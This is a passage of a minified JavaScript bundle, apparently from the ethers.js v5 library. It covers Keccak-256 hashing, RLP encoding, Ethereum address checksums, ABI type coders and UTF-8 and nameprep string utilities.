>>30,Rn=q[43]<<2|q[42]>>>30,ur=q[5]<<30|q[4]>>>2,Tt=q[4]<<30|q[5]>>>2,Ur=q[14]<<6|q[15]>>>26,Vt=q[15]<<6|q[14]>>>26,nt=q[25]<<11|q[24]>>>21,ct=q[24]<<11|q[25]>>>21,rr=q[34]<<15|q[35]>>>17,Kt=q[35]<<15|q[34]>>>17,$t=q[45]<<29|q[44]>>>3,xt=q[44]<<29|q[45]>>>3,H=q[6]<<28|q[7]>>>4,ie=q[7]<<28|q[6]>>>4,ui=q[17]<<23|q[16]>>>9,Ar=q[16]<<23|q[17]>>>9,jr=q[26]<<25|q[27]>>>7,Br=q[27]<<25|q[26]>>>7,St=q[36]<<21|q[37]>>>11,zt=q[37]<<21|q[36]>>>11,wt=q[47]<<24|q[46]>>>8,ir=q[46]<<24|q[47]>>>8,or=q[8]<<27|q[9]>>>5,ar=q[9]<<27|q[8]>>>5,pe=q[18]<<20|q[19]>>>12,we=q[19]<<20|q[18]>>>12,ri=q[29]<<7|q[28]>>>25,qn=q[28]<<7|q[29]>>>25,Ct=q[38]<<8|q[39]>>>24,er=q[39]<<8|q[38]>>>24,Q=q[48]<<14|q[49]>>>18,z=q[49]<<14|q[48]>>>18,q[0]=Ae^~Le&nt,q[1]=De^~it&ct,q[10]=H^~pe&_e,q[11]=ie^~we&et,q[20]=Mt^~Ur&jr,q[21]=Pr^~Vt&Br,q[30]=or^~It&lr,q[31]=ar^~cr&At,q[40]=ur^~ui&ri,q[41]=Tt^~Ar&qn,q[2]=Le^~nt&St,q[3]=it^~ct&zt,q[12]=pe^~_e&yt,q[13]=we^~et&Ye,q[22]=Ur^~jr&Ct,q[23]=Vt^~Br&er,q[32]=It^~lr&rr,q[33]=cr^~At&Kt,q[42]=ui^~ri&yo,q[43]=Ar^~qn&xo,q[4]=nt^~St&Q,q[5]=ct^~zt&z,q[14]=_e^~yt&$t,q[15]=et^~Ye&xt,q[24]=jr^~Ct&tr,q[25]=Br^~er&mt,q[34]=lr^~rr&wt,q[35]=At^~Kt&ir,q[44]=ri^~yo&Co,q[45]=qn^~xo&Rn,q[6]=St^~Q&Ae,q[7]=zt^~z&De,q[16]=yt^~$t&H,q[17]=Ye^~xt&ie,q[26]=Ct^~tr&Mt,q[27]=er^~mt&Pr,q[36]=rr^~wt&or,q[37]=Kt^~ir&ar,q[46]=yo^~Co&ur,q[47]=xo^~Rn&Tt,q[8]=Q^~Ae&Le,q[9]=z^~De&it,q[18]=$t^~H&pe,q[19]=xt^~ie&we,q[28]=tr^~Mt&Ur,q[29]=mt^~Pr&Vt,q[38]=wt^~or&It,q[39]=ir^~ar&cr,q[48]=Co^~ur&ui,q[49]=Rn^~Tt&Ar,q[0]^=g[ae],q[1]^=g[ae+1]};if(a)r.exports=b;else for(_=0;_<v.length;++_)n[v[_]]=b[v[_]]})()}(DE)),DE.exports}var Qae=Jae();const Xae=Ss(Qae);function Ui(r){return"0x"+Xae.keccak_256(ze(r))}const ece=Object.freeze(Object.defineProperty({__proto__:null,keccak256:Ui},Symbol.toStringTag,{value:"Module"})),tce="rlp/5.8.0",nd=new be(tce);function XB(r){const e=[];for(;r;)e.unshift(r&255),r>>=8;return e}function eM(r,e,t){let i=0;for(let n=0;n<t;n++)i=i*256+r[e+n];return i}function fZ(r){if(Array.isArray(r)){let i=[];if(r.forEach(function(s){i=i.concat(fZ(s))}),i.length<=55)return i.unshift(192+i.length),i;const n=XB(i.length);return n.unshift(247+n.length),n.concat(i)}Vy(r)||nd.throwArgumentError("RLP object must be BytesLike","object",r);const e=Array.prototype.slice.call(ze(r));if(e.length===1&&e[0]<=127)return e;if(e.length<=55)return e.unshift(128+e.length),e;const t=XB(e.length);return t.unshift(183+t.length),t.concat(e)}function H1(r){return Qe(fZ(r))}function tM(r,e,t,i){const n=[];for(;t<e+1+i;){const s=pZ(r,t);n.push(s.result),t+=s.consumed,t>e+1+i&&nd.throwError("child data too short",be.errors.BUFFER_OVERRUN,{})}return{consumed:1+i,result:n}}function pZ(r,e){if(r.length===0&&nd.throwError("data too short",be.errors.BUFFER_OVERRUN,{}),r[e]>=248){const t=r[e]-247;e+1+t>r.length&&nd.throwError("data short segment too short",be.errors.BUFFER_OVERRUN,{});const i=eM(r,e+1,t);return e+1+t+i>r.length&&nd.throwError("data long segment too short",be.errors.BUFFER_OVERRUN,{}),tM(r,e,e+1+t,t+i)}else if(r[e]>=192){const t=r[e]-192;return e+1+t>r.length&&nd.throwError("data array too short",be.errors.BUFFER_OVERRUN,{}),tM(r,e,e+1,t)}else if(r[e]>=184){const t=r[e]-183;e+1+t>r.length&&nd.throwError("data array too short",be.errors.BUFFER_OVERRUN,{});const i=eM(r,e+1,t);e+1+t+i>r.length&&nd.throwError("data array too short",be.errors.BUFFER_OVERRUN,{});const n=Qe(r.slice(e+1+t,e+1+t+i));return{consumed:1+t+i,result:n}}else if(r[e]>=128){const t=r[e]-128;e+1+t>r.length&&nd.throwError("data too short",be.errors.BUFFER_OVERRUN,{});const i=Qe(r.slice(e+1,e+1+t));return{consumed:1+t,result:i}}return{consumed:1,result:Qe(r[e])}}function kx(r){const e=ze(r),t=pZ(e,0);return t.consumed!==e.length&&nd.throwArgumentError("invalid rlp data","data",r),t.result}const rce=Object.freeze(Object.defineProperty({__proto__:null,decode:kx,encode:H1},Symbol.toStringTag,{value:"Module"})),ice="address/5.8.0",Nf=new be(ice);function rM(r){Jr(r,20)||Nf.throwArgumentError("invalid address","address",r),r=r.toLowerCase();const e=r.substring(2).split(""),t=new Uint8Array(40);for(let n=0;n<40;n++)t[n]=e[n].charCodeAt(0);const i=ze(Ui(t));for(let n=0;n<40;n+=2)i[n>>1]>>4>=8&&(e[n]=e[n].toUpperCase()),(i[n>>1]&15)>=8&&(e[n+1]=e[n+1].toUpperCase());return"0x"+e.join("")}const nce=9007199254740991;function sce(r){return Math.log10?Math.log10(r):Math.log(r)/Math.LN10}const c$={};for(let r=0;r<10;r++)c$[String(r)]=String(r);for(let r=0;r<26;r++)c$[String.fromCharCode(65+r)]=String(10+r);const iM=Math.floor(sce(nce));function gZ(r){r=r.toUpperCase(),r=r.substring(4)+r.substring(0,2)+"00";let e=r.split("").map(i=>c$[i]).join("");for(;e.length>=iM;){let i=e.substring(0,iM);e=parseInt(i,10)%97+e.substring(i.length)}let t=String(98-parseInt(e,10)%97);for(;t.length<2;)t="0"+t;return t}function Oi(r){let e=null;if(typeof r!="string"&&Nf.throwArgumentError("invalid address","address",r),r.match(/^(0x)?[0-9a-fA-F]{40}$/))r.substring(0,2)!=="0x"&&(r="0x"+r),e=rM(r),r.match(/([A-F].*[a-f])|([a-f].*[A-F])/)&&e!==r&&Nf.throwArgumentError("bad address checksum","address",r);else if(r.match(/^XE[0-9]{2}[0-9A-Za-z]{30,31}$/)){for(r.substring(2,4)!==gZ(r)&&Nf.throwArgumentError("bad icap checksum","address",r),e=Lae(r.substring(4));e.length<40;)e="0"+e;e=rM("0x"+e)}else Nf.throwArgumentError("invalid address","address",r);return e}function oce(r){try{return Oi(r),!0}catch{}return!1}function ace(r){let e=Uae(Oi(r).substring(2)).toUpperCase();for(;e.length<30;)e="0"+e;return"XE"+gZ("XE00"+e)+e}function l$(r){let e=null;try{e=Oi(r.from)}catch{Nf.throwArgumentError("missing from address","transaction",r)}const t=bd(ze(Ge.from(r.nonce).toHexString()));return Oi(Nn(Ui(H1([e,t])),12))}function cce(r,e,t){return Ad(e)!==32&&Nf.throwArgumentError("salt must be 32 bytes","salt",e),Ad(t)!==32&&Nf.throwArgumentError("initCodeHash must be 32 bytes","initCodeHash",t),Oi(Nn(Ui(cn(["0xff",Oi(r),e,t])),12))}const lce=Object.freeze(Object.defineProperty({__proto__:null,getAddress:Oi,getContractAddress:l$,getCreate2Address:cce,getIcapAddress:ace,isAddress:oce},Symbol.toStringTag,{value:"Module"}));class uce extends S0{constructor(e){super("address","address",e,!1)}defaultValue(){return"0x0000000000000000000000000000000000000000"}encode(e,t){try{t=Oi(t)}catch(i){this._throwError(i.message,t)}return e.writeValue(t)}decode(e){return Oi(Xi(e.readValue().toHexString(),20))}}class dce extends S0{constructor(e){super(e.name,e.type,void 0,e.dynamic),this.coder=e}defaultValue(){return this.coder.defaultValue()}encode(e,t){return this.coder.encode(e,t)}decode(e){return this.coder.decode(e)}}const zm=new be(Gy);function mZ(r,e,t){let i=null;if(Array.isArray(t))i=t;else if(t&&typeof t=="object"){let c={};i=e.map(l=>{const u=l.localName;return u||zm.throwError("cannot encode object for signature with missing names",be.errors.INVALID_ARGUMENT,{argument:"values",coder:l,value:t}),c[u]&&zm.throwError("cannot encode object for signature with duplicate names",be.errors.INVALID_ARGUMENT,{argument:"values",coder:l,value:t}),c[u]=!0,t[u]})}else zm.throwArgumentError("invalid tuple value","tuple",t);e.length!==i.length&&zm.throwArgumentError("types/value length mismatch","tuple",t);let n=new zT(r.wordSize),s=new zT(r.wordSize),o=[];e.forEach((c,l)=>{let u=i[l];if(c.dynamic){let d=s.length;c.encode(s,u);let h=n.writeUpdatableValue();o.push(f=>{h(f+d)})}else c.encode(n,u)}),o.forEach(c=>{c(n.length)});let a=r.appendWriter(n);return a+=r.appendWriter(s),a}function wZ(r,e){let t=[],i=r.subReader(0);e.forEach(s=>{let o=null;if(s.dynamic){let a=r.readValue(),c=i.subReader(a.toNumber());try{o=s.decode(c)}catch(l){if(l.code===be.errors.BUFFER_OVERRUN)throw l;o=l,o.baseType=s.name,o.name=s.localName,o.type=s.type}}else try{o=s.decode(r)}catch(a){if(a.code===be.errors.BUFFER_OVERRUN)throw a;o=a,o.baseType=s.name,o.name=s.localName,o.type=s.type}o!=null&&t.push(o)});const n=e.reduce((s,o)=>{const a=o.localName;return a&&(s[a]||(s[a]=0),s[a]++),s},{});e.forEach((s,o)=>{let a=s.localName;if(!a||n[a]!==1||(a==="length"&&(a="_length"),t[a]!=null))return;const c=t[o];c instanceof Error?Object.defineProperty(t,a,{enumerable:!0,get:()=>{throw c}}):t[a]=c});for(let s=0;s<t.length;s++){const o=t[s];o instanceof Error&&Object.defineProperty(t,s,{enumerable:!0,get:()=>{throw o}})}return Object.freeze(t)}class hce extends S0{constructor(e,t,i){const n=e.type+"["+(t>=0?t:"")+"]",s=t===-1||e.dynamic;super("array",n,i,s),this.coder=e,this.length=t}defaultValue(){const e=this.coder.defaultValue(),t=[];for(let i=0;i<this.length;i++)t.push(e);return t}encode(e,t){Array.isArray(t)||this._throwError("expected array value",t);let i=this.length;i===-1&&(i=t.length,e.writeValue(t.length)),zm.checkArgumentCount(t.length,i,"coder array"+(this.localName?" "+this.localName:""));let n=[];for(let s=0;s<t.length;s++)n.push(this.coder);return mZ(e,n,t)}decode(e){let t=this.length;t===-1&&(t=e.readValue().toNumber(),t*32>e._data.length&&zm.throwError("insufficient data length",be.errors.BUFFER_OVERRUN,{length:e._data.length,count:t}));let i=[];for(let n=0;n<t;n++)i.push(new dce(this.coder));return e.coerce(this.name,wZ(e,i))}}class fce extends S0{constructor(e){super("bool","bool",e,!1)}defaultValue(){return!1}encode(e,t){return e.writeValue(t?1:0)}decode(e){return e.coerce(this.type,!e.readValue().isZero())}}class bZ extends S0{constructor(e,t){super(e,e,t,!0)}defaultValue(){return"0x"}encode(e,t){t=ze(t);let i=e.writeValue(t.length);return i+=e.writeBytes(t),i}decode(e){return e.readBytes(e.readValue().toNumber(),!0)}}class pce extends bZ{constructor(e){super("bytes",e)}decode(e){return e.coerce(this.name,Qe(super.decode(e)))}}class gce extends S0{constructor(e,t){let i="bytes"+String(e);super(i,i,t,!1),this.size=e}defaultValue(){return"0x0000000000000000000000000000000000000000000000000000000000000000".substring(0,2+this.size*2)}encode(e,t){let i=ze(t);return i.length!==this.size&&this._throwError("incorrect data length",t),e.writeBytes(i)}decode(e){return e.coerce(this.name,Qe(e.readBytes(this.size)))}}class mce extends S0{constructor(e){super("null","",e,!1)}defaultValue(){return null}encode(e,t){return t!=null&&this._throwError("not null",t),e.writeBytes([])}decode(e){return e.readBytes(0),e.coerce(this.name,null)}}const wce="0x0000000000000000000000000000000000000000",bce=Ge.from(-1),vZ=Ge.from(0),vce=Ge.from(1),yce=Ge.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),yZ="0x0000000000000000000000000000000000000000000000000000000000000000";class xce extends S0{constructor(e,t,i){const n=(t?"int":"uint")+e*8;super(n,n,i,!1),this.size=e,this.signed=t}defaultValue(){return 0}encode(e,t){let i=Ge.from(t),n=yce.mask(e.wordSize*8);if(this.signed){let s=n.mask(this.size*8-1);(i.gt(s)||i.lt(s.add(vce).mul(bce)))&&this._throwError("value out-of-bounds",t)}else(i.lt(vZ)||i.gt(n.mask(this.size*8)))&&this._throwError("value out-of-bounds",t);return i=i.toTwos(this.size*8).mask(this.size*8),this.signed&&(i=i.fromTwos(this.size*8).toTwos(8*e.wordSize)),e.writeValue(i)}decode(e){let t=e.readValue().mask(this.size*8);return this.signed&&(t=t.fromTwos(this.size*8)),e.coerce(this.name,t)}}const Cce="strings/5.8.0",xZ=new be(Cce);var Td;(function(r){r.current="",r.NFC="NFC",r.NFD="NFD",r.NFKC="NFKC",r.NFKD="NFKD"})(Td||(Td={}));var Ca;(function(r){r.UNEXPECTED_CONTINUE="unexpected continuation byte",r.BAD_PREFIX="bad codepoint prefix",r.OVERRUN="string overrun",r.MISSING_CONTINUE="missing continuation byte",r.OUT_OF_RANGE="out of UTF-8 range",r.UTF16_SURROGATE="UTF-16 surrogate",r.OVERLONG="overlong representation"})(Ca||(Ca={}));function Ece(r,e,t,i,n){return xZ.throwArgumentError(`invalid codepoint at offset ${e}; ${r}`,"bytes",t)}function CZ(r,e,t,i,n){if(r===Ca.BAD_PREFIX||r===Ca.UNEXPECTED_CONTINUE){let s=0;for(let o=e+1;o<t.length&&t[o]>>6===2;o++)s++;return s}return r===Ca.OVERRUN?t.length-e-1:0}function _ce(r,e,t,i,n){return r===Ca.OVERLONG?(i.push(n),0):(i.push(65533),CZ(r,e,t))}const EZ=Object.freeze({error:Ece,ignore:CZ,replace:_ce});function u$(r,e){e==null&&(e=EZ.error),r=ze(r);const t=[];let i=0;for(;i<r.length;){const n=r[i++];if(n>>7===0){t.push(n);continue}let s=null,o=null;if((n&224)===192)s=1,o=127;else if((n&240)===224)s=2,o=2047;else if((n&248)===240)s=3,o=65535;else{(n&192)===128?i+=e(Ca.UNEXPECTED_CONTINUE,i-1,r,t):i+=e(Ca.BAD_PREFIX,i-1,r,t);continue}if(i-1+s>=r.length){i+=e(Ca.OVERRUN,i-1,r,t);continue}let a=n&(1<<8-s-1)-1;for(let c=0;c<s;c++){let l=r[i];if((l&192)!=128){i+=e(Ca.MISSING_CONTINUE,i,r,t),a=null;break}a=a<<6|l&63,i++}if(a!==null){if(a>1114111){i+=e(Ca.OUT_OF_RANGE,i-1-s,r,t,a);continue}if(a>=55296&&a<=57343){i+=e(Ca.UTF16_SURROGATE,i-1-s,r,t,a);continue}if(a<=o){i+=e(Ca.OVERLONG,i-1-s,r,t,a);continue}t.push(a)}}return t}function Fn(r,e=Td.current){e!=Td.current&&(xZ.checkNormalize(),r=r.normalize(e));let t=[];for(let i=0;i<r.length;i++){const n=r.charCodeAt(i);if(n<128)t.push(n);else if(n<2048)t.push(n>>6|192),t.push(n&63|128);else if((n&64512)==55296){i++;const s=r.charCodeAt(i);if(i>=r.length||(s&64512)!==56320)throw new Error("invalid utf-8 string");const o=65536+((n&1023)<<10)+(s&1023);t.push(o>>18|240),t.push(o>>12&63|128),t.push(o>>6&63|128),t.push(o&63|128)}else t.push(n>>12|224),t.push(n>>6&63|128),t.push(n&63|128)}return ze(t)}function LE(r){const e="0000"+r.toString(16);return"\\u"+e.substring(e.length-4)}function Sce(r,e){return'"'+u$(r,e).map(t=>{if(t<256){switch(t){case 8:return"\\b";case 9:return"\\t";case 10:return"\\n";case 13:return"\\r";case 34:return'\\"';case 92:return"\\\\"}if(t>=32&&t<127)return String.fromCharCode(t)}return t<=65535?LE(t):(t-=65536,LE((t>>10&1023)+55296)+LE((t&1023)+56320))}).join("")+'"'}function WT(r){return r.map(e=>e<=65535?String.fromCharCode(e):(e-=65536,String.fromCharCode((e>>10&1023)+55296,(e&1023)+56320))).join("")}function Cp(r,e){return WT(u$(r,e))}function B9(r,e=Td.current){return u$(Fn(r,e))}function Ace(r){const e=Fn(r);if(e.length>31)throw new Error("bytes32 string must be less than 32 bytes");return Qe(cn([e,yZ]).slice(0,32))}function Ice(r){const e=ze(r);if(e.length!==32)throw new Error("invalid bytes32 - not 32 bytes long");if(e[31]!==0)throw new Error("invalid bytes32 string - no null terminator");let t=31;for(;e[t-1]===0;)t--;return Cp(e.slice(0,t))}function Tce(r){if(r.length%4!==0)throw new Error("bad data");let e=[];for(let t=0;t<r.length;t+=4)e.push(parseInt(r.substring(t,t+4),16));return e}function d$(r,e){e||(e=function(n){return[parseInt(n,16)]});let t=0,i={};return r.split(",").forEach(n=>{let s=n.split(":");t+=parseInt(s[0],16),i[t]=e(s[1])}),i}function _Z(r){let e=0;return r.split(",").map(t=>{let i=t.split("-");i.length===1?i[1]="0":i[1]===""&&(i[1]="1");let n=e+parseInt(i[0],16);return e=parseInt(i[1],16),{l:n,h:e}})}function h$(r,e){let t=0;for(let i=0;i<e.length;i++){let n=e[i];if(t+=n.l,r>=t&&r<=t+n.h&&(r-t)%(n.d||1)===0){if(n.e&&n.e.indexOf(r-t)!==-1)continue;return n}}return null}const kce=_Z("221,13-1b,5f-,40-10,51-f,11-3,3-3,2-2,2-4,8,2,15,2d,28-8,88,48,27-,3-5,11-20,27-,8,28,3-5,12,18,b-a,1c-4,6-16,2-d,2-2,2,1b-4,17-9,8f-,10,f,1f-2,1c-34,33-14e,4,36-,13-,6-2,1a-f,4,9-,3-,17,8,2-2,5-,2,8-,3-,4-8,2-3,3,6-,16-6,2-,7-3,3-,17,8,3,3,3-,2,6-3,3-,4-a,5,2-6,10-b,4,8,2,4,17,8,3,6-,b,4,4-,2-e,2-4,b-10,4,9-,3-,17,8,3-,5-,9-2,3-,4-7,3-3,3,4-3,c-10,3,7-2,4,5-2,3,2,3-2,3-2,4-2,9,4-3,6-2,4,5-8,2-e,d-d,4,9,4,18,b,6-3,8,4,5-6,3-8,3-3,b-11,3,9,4,18,b,6-3,8,4,5-6,3-6,2,3-3,b-11,3,9,4,18,11-3,7-,4,5-8,2-7,3-3,b-11,3,13-2,19,a,2-,8-2,2-3,7,2,9-11,4-b,3b-3,1e-24,3,2-,3,2-,2-5,5,8,4,2,2-,3,e,4-,6,2,7-,b-,3-21,49,23-5,1c-3,9,25,10-,2-2f,23,6,3,8-2,5-5,1b-45,27-9,2a-,2-3,5b-4,45-4,53-5,8,40,2,5-,8,2,5-,28,2,5-,20,2,5-,8,2,5-,8,8,18,20,2,5-,8,28,14-5,1d-22,56-b,277-8,1e-2,52-e,e,8-a,18-8,15-b,e,4,3-b,5e-2,b-15,10,b-5,59-7,2b-555,9d-3,5b-5,17-,7-,27-,7-,9,2,2,2,20-,36,10,f-,7,14-,4,a,54-3,2-6,6-5,9-,1c-10,13-1d,1c-14,3c-,10-6,32-b,240-30,28-18,c-14,a0,115-,3,66-,b-76,5,5-,1d,24,2,5-2,2,8-,35-2,19,f-10,1d-3,311-37f,1b,5a-b,d7-19,d-3,41,57-,68-4,29-3,5f,29-37,2e-2,25-c,2c-2,4e-3,30,78-3,64-,20,19b7-49,51a7-59,48e-2,38-738,2ba5-5b,222f-,3c-94,8-b,6-4,1b,6,2,3,3,6d-20,16e-f,41-,37-7,2e-2,11-f,5-b,18-,b,14,5-3,6,88-,2,bf-2,7-,7-,7-,4-2,8,8-9,8-2ff,20,5-b,1c-b4,27-,27-cbb1,f7-9,28-2,b5-221,56,48,3-,2-,3-,5,d,2,5,3,42,5-,9,8,1d,5,6,2-2,8,153-3,123-3,33-27fd,a6da-5128,21f-5df,3-fffd,3-fffd,3-fffd,3-fffd,3-fffd,3-fffd,3-fffd,3-fffd,3-fffd,3-fffd,3-fffd,3,2-1d,61-ff7d"),Nce="ad,34f,1806,180b,180c,180d,200b,200c,200d,2060,feff".split(",").map(r=>parseInt(r,16)),Pce=[{h:25,s:32,l:65},{h:30,s:32,e:[23],l:127},{h:54,s:1,e:[48],l:64,d:2},{h:14,s:1,l:57,d:2},{h:44,s:1,l:17,d:2},{h:10,s:1,e:[2,6,8],l:61,d:2},{h:16,s:1,l:68,d:2},{h:84,s:1,e:[18,24,66],l:19,d:2},{h:26,s:32,e:[17],l:435},{h:22,s:1,l:71,d:2},{h:15,s:80,l:40},{h:31,s:32,l:16},{h:32,s:1,l:80,d:2},{h:52,s:1,l:42,d:2},{h:12,s:1,l:55,d:2},{h:40,s:1,e:[38],l:15,d:2},{h:14,s:1,l:48,d:2},{h:37,s:48,l:49},{h:148,s:1,l:6351,d:2},{h:88,s:1,l:160,d:2},{h:15,s:16,l:704},{h:25,s:26,l:854},{h:25,s:32,l:55915},{h:37,s:40,l:1247},{h:25,s:-119711,l:53248},{h:25,s:-119763,l:52},{h:25,s:-119815,l:52},{h:25,s:-119867,e:[1,4,5,7,8,11,12,17],l:52},{h:25,s:-119919,l:52},{h:24,s:-119971,e:[2,7,8,17],l:52},{h:24,s:-120023,e:[2,7,13,15,16,17],l:52},{h:25,s:-120075,l:52},{h:25,s:-120127,l:52},{h:25,s:-120179,l:52},{h:25,s:-120231,l:52},{h:25,s:-120283,l:52},{h:25,s:-120335,l:52},{h:24,s:-119543,e:[17],l:56},{h:24,s:-119601,e:[17],l:58},{h:24,s:-119659,e:[17],l:58},{h:24,s:-119717,e:[17],l:58},{h:24,s:-119775,e:[17],l:58}],$ce=d$("b5:3bc,c3:ff,7:73,2:253,5:254,3:256,1:257,5:259,1:25b,3:260,1:263,2:269,1:268,5:26f,1:272,2:275,7:280,3:283,5:288,3:28a,1:28b,5:292,3f:195,1:1bf,29:19e,125:3b9,8b:3b2,1:3b8,1:3c5,3:3c6,1:3c0,1a:3ba,1:3c1,1:3c3,2:3b8,1:3b5,1bc9:3b9,1c:1f76,1:1f77,f:1f7a,1:1f7b,d:1f78,1:1f79,1:1f7c,1:1f7d,107:63,5:25b,4:68,1:68,1:68,3:69,1:69,1:6c,3:6e,4:70,1:71,1:72,1:72,1:72,7:7a,2:3c9,2:7a,2:6b,1:e5,1:62,1:63,3:65,1:66,2:6d,b:3b3,1:3c0,6:64,1b574:3b8,1a:3c3,20:3b8,1a:3c3,20:3b8,1a:3c3,20:3b8,1a:3c3,20:3b8,1a:3c3"),Rce=d$("179:1,2:1,2:1,5:1,2:1,a:4f,a:1,8:1,2:1,2:1,3:1,5:1,3:1,4:1,2:1,3:1,4:1,8:2,1:1,2:2,1:1,2:2,27:2,195:26,2:25,1:25,1:25,2:40,2:3f,1:3f,33:1,11:-6,1:-9,1ac7:-3a,6d:-8,1:-8,1:-8,1:-8,1:-8,1:-8,1:-8,1:-8,9:-8,1:-8,1:-8,1:-8,1:-8,1:-8,b:-8,1:-8,1:-8,1:-8,1:-8,1:-8,1:-8,1:-8,9:-8,1:-8,1:-8,1:-8,1:-8,1:-8,1:-8,1:-8,9:-8,1:-8,1:-8,1:-8,1:-8,1:-8,c:-8,2:-8,2:-8,2:-8,9:-8,1:-8,1:-8,1:-8,1:-8,1:-8,1:-8,1:-8,49:-8,1:-8,1:-4a,1:-4a,d:-56,1:-56,1:-56,1:-56,d:-8,1:-8,f:-8,1:-8,3:-7"),Oce=d$("df:00730073,51:00690307,19:02BC006E,a7:006A030C,18a:002003B9,16:03B903080301,20:03C503080301,1d7:05650582,190f:00680331,1:00740308,1:0077030A,1:0079030A,1:006102BE,b6:03C50313,2:03C503130300,2:03C503130301,2:03C503130342,2a:1F0003B9,1:1F0103B9,1:1F0203B9,1:1F0303B9,1:1F0403B9,1:1F0503B9,1:1F0603B9,1:1F0703B9,1:1F0003B9,1:1F0103B9,1:1F0203B9,1:1F0303B9,1:1F0403B9,1:1F0503B9,1:1F0603B9,1:1F0703B9,1:1F2003B9,1:1F2103B9,1:1F2203B9,1:1F2303B9,1:1F2403B9,1:1F2503B9,1:1F2603B9,1:1F2703B9,1:1F2003B9,1:1F2103B9,1:1F2203B9,1:1F2303B9,1:1F2403B9,1:1F2503B9,1:1F2603B9,1:1F2703B9,1:1F6003B9,1:1F6103B9,1:1F6203B9,1:1F6303B9,1:1F6403B9,1:1F6503B9,1:1F6603B9,1:1F6703B9,1:1F6003B9,1:1F6103B9,1:1F6203B9,1:1F6303B9,1:1F6403B9,1:1F6503B9,1:1F6603B9,1:1F6703B9,3:1F7003B9,1:03B103B9,1:03AC03B9,2:03B10342,1:03B1034203B9,5:03B103B9,6:1F7403B9,1:03B703B9,1:03AE03B9,2:03B70342,1:03B7034203B9,5:03B703B9,6:03B903080300,1:03B903080301,3:03B90342,1:03B903080342,b:03C503080300,1:03C503080301,1:03C10313,2:03C50342,1:03C503080342,b:1F7C03B9,1:03C903B9,1:03CE03B9,2:03C90342,1:03C9034203B9,5:03C903B9,ac:00720073,5b:00B00063,6:00B00066,d:006E006F,a:0073006D,1:00740065006C,1:0074006D,124f:006800700061,2:00610075,2:006F0076,b:00700061,1:006E0061,1:03BC0061,1:006D0061,1:006B0061,1:006B0062,1:006D0062,1:00670062,3:00700066,1:006E0066,1:03BC0066,4:0068007A,1:006B0068007A,1:006D0068007A,1:00670068007A,1:00740068007A,15:00700061,1:006B00700061,1:006D00700061,1:006700700061,8:00700076,1:006E0076,1:03BC0076,1:006D0076,1:006B0076,1:006D0076,1:00700077,1:006E0077,1:03BC0077,1:006D0077,1:006B0077,1:006D0077,1:006B03C9,1:006D03C9,2:00620071,3:00632215006B0067,1:0063006F002E,1:00640062,1:00670079,2:00680070,2:006B006B,1:006B006D,9:00700068,2:00700070006D,1:00700072,2:00730076,1:00770062,c723:00660066,1:00660069,1:0066006C,1:006600660069,1:00660066006C,1:00730074,1:00730074,d:05740576,1:05740565,1:0574056B,1:057E0576,1:0574056D",Tce),Bce=_Z("80-20,2a0-,39c,32,f71,18e,7f2-f,19-7,30-4,7-5,f81-b,5,a800-20ff,4d1-1f,110,fa-6,d174-7,2e84-,ffff-,ffff-,ffff-,ffff-,ffff-,ffff-,ffff-,ffff-,ffff-,ffff-,ffff-,ffff-,2,1f-5f,ff7f-20001");function Mce(r){return r.reduce((e,t)=>(t.forEach(i=>{e.push(i)}),e),[])}function Dce(r){return!!h$(r,kce)}function Lce(r){let e=h$(r,Pce);if(e)return[r+e.s];let t=$ce[r];if(t)return t;let i=Rce[r];if(i)return[r+i[0]];let n=Oce[r];return n||null}function Uce(r){return!!h$(r,Bce)}function jce(r){if(r.match(/^[a-z0-9-]*$/i)&&r.length<=59)return r.toLowerCase();let e=B9(r);e=Mce(e.map(i=>{if(Nce.indexOf(i)>=0)return[];if(i>=65024&&i<=65039)return[];let n=Lce(i);return n||[i]})),e=B9(WT(e),Td.NFKC),e.forEach(i=>{if(Uce(i))throw new Error("STRINGPREP_CONTAINS_PROHIBITED")}),e.forEach(i=>{if(Dce(i))throw new Error("STRINGPREP_CONTAINS_UNASSIGNED")});let t=WT(e);if(t.substring(0,1)==="-"||t.substring(2,4)==="--"||t.substring(t.length-1)==="-")throw new Error("invalid hyphen");return t}const Fce=Object.freeze(Object.defineProperty({__proto__:null,get UnicodeNormalizationForm(){return Td},Utf8ErrorFuncs:EZ,get Utf8ErrorReason(){return Ca},_toEscapedUtf8String:Sce,formatBytes32String:Ace,nameprep:jce,parseBytes32String:Ice,toUtf8Bytes:Fn,toUtf8CodePoints:B9,toUtf8String:Cp},Symbol.toStringTag,{value:"Module"}));class qce extends bZ{constructor(e){super("string",e)}defaultValue(){return""}encode(e,t){return super.encode(e,Fn(t))}decode(e){return Cp(super.decode(e))}}class E6 extends S0{constructor(e,t){let i=!1;const n=[];e.forEach(o=>{o.dynamic&&(i=!0),n.push(o.type)});const s="tuple("+n.join(",")+")";super("tuple",s,t,i),this.coders=e}defaultValue(){const e=[];this.coders.forEach(i=>{e.push(i.defaultValue())});const t=this.coders.reduce((i,n)=>{const s=n.localName;return s&&(i[s]||(i[s]=0),i[s]++),i},{});return this.coders.forEach((i,n)=>{let s=i.localName;!s||t[s]!==1||(s==="length"&&(s="_length"),e[s]==null&&(e[s]=e[n]))}),Object.freeze(e)}encode(e,t){return mZ(e,this.coders,t)}decode(e){return e.coerce(this.name,wZ(e,this.coders))}}const _6=new be(Gy),zce=new RegExp(/^bytes([0-9]*)$/),Wce=new RegExp(/^(u?int)([0-9]*)$/);class SZ{constructor(e){Pe(this,"coerceFunc",e||null)}_getCoder(e){switch(e.baseType){case"address":return new uce(e.name);case"bool":return new fce(e.name);case"string":return new qce(e.name);case"bytes":return new pce(e.name);case"array":return new hce(this._getCoder(e.arrayChildren),e.arrayLength,e.name);case"tuple":return new E6((e.components||[]).map(i=>this._getCoder(i)),e.name);case"":return new mce(e.name)}let t=e.type.match(Wce);if(t){let i=parseInt(t[2]||"256");return(i===0||i>256||i%8!==0)&&_6.throwArgumentError("invalid "+t[1]+" bit length","param",e),new xce(i/8,t[1]==="int",e.name)}if(t=e.type.match(zce),t){let i=parseInt(t[1]);return(i===0||i>32)&&_6.throwArgumentError("invalid bytes length","param",e),new gce(i,e.name)}return _6.throwArgumentError("invalid type","type",e.type)}_getWordSize(){return 32}_getReader(e,t){return new O9(e,this._getWordSize(),this.coerceFunc,t)}_getWriter(){return new zT(this._getWordSize())}getDefaultValue(e){const t=e.map(n=>this._getCoder(xs.from(n)));return new E6(t,"_").defaultValue()}encode(e,t){e.length!==t.length&&_6.throwError("types/values length 